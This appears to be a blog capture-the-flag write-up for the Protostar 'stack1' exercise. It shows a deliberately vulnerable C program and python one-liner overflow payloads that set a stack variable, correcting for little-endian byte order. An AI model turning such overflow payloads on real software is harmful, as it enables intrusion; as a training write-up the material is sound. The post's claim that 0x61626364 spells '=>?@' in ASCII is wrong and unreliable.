---
layout: post
title: Protostar Writeup - stack1
updated: 2018-07-25 21:00
tags: [ctf, binary exploit, tech, protostar]
---

## Protostar - stack1

Moving on to the next challenge of Protostar. Before reading any further, I strongly advise that you try this challenge yourself first.
If you have taken a look at my [previous](http://laptop64.co/notes/proto-stack0) writeup, you can see that this challenge is fairly simple.
Instead of just modifying the 'modfied' variable we have to change it to a specific value which is `0x61626364`, which is basically '=', '>', '?' & '@' in ascii.
Here's the code:

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    if(argc == 1) {
        errx(1, "please specify an argument\n");
    }

    modified = 0;
    strcpy(buffer, argv[1]);

    if(modified == 0x61626364) {
        printf("you have correctly got the variable to the right value\n");
    } else {
        printf("Try again, you got 0x%08x\n", modified);
    }
}
{% endhighlight %}

Another change that we notice is that there is no `gets()` for input, instead we're taking input from the command line.
So how do we overflow this? Let's take a peek at the `strcpy()` man since this is what is used to copy into the buffer.
Scrolling down to the BUGS section, everything becomes clear.

> If the destination string of a strcpy() is not large enought, then anything might happen. Overflowing...favorite cracker technique.

With this information we can confirm that this is a buffer overflow attack. Using our knowledge from the previous write up, let's write our overflow.

{% highlight shell %}
$ ./stack1 $(python -c "print 'A' * 64 + '\x61\x62\x63\x64'")
Try again, you got 0x64636261
{% endhighlight %}

What?! How did that not work? The value of modified has changed, but it's "0x64636261" and not "0x61626364". Why so?
If we take a look at the site we see a little hint:

> Protostar is little endian

What this means is that when giving input data, the data stored with the LSB first and MSB last. So the fix is simple, just reverse the bytes.

{% highlight shell %}
$ ./stack1 $(python -c "print 'A' * 64 + '\x64\x63\x62\x61'")
you have correctly got the variable to the right value
{% endhighlight %}

And there you have it, nice and easy.

### Sites

[Protostar](https://exploit-exercises.com/protostar/)
[Phrack](http://phrack.org/issues/49/14.html)
[endianness](https://en.wikipedia.org/wiki/Endianness)
